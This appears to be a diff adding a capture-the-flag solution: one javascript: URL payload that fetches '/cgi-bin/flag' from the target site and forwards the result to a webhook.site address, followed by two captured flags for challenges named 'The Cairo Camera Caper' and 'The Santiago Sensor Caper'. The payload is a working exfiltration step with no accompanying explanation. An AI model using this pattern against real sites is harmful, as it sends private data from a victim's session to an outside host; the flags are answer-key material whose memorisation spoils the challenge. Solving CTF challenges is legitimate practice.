@@ -1,0 +1,7 @@
+javascript:fetch("/cgi-bin/flag").then((r)=>r.text()).then((r)=>window.location.href="https://webhook.site/c7c327b2-81ef-4267-880f-be92a5b57387/?flag="+r)
+	
+	# The Cairo Camera Caper
+	PCTF{3veRy1_4lWay5_a5ks_wh3rE_1s_C4rmEn_5and1Eg0_n0bodY_ev3r_aSK5_h0W_1s_caRm3n_sAnDi3go}
+
+	# The Santiago Sensor Caper
+	PCTF{y3Ah_sh3_Sw1ndL3s_All_y0ur_s3NSors_fR0m_p0rtO_t0_s4ntI4go}
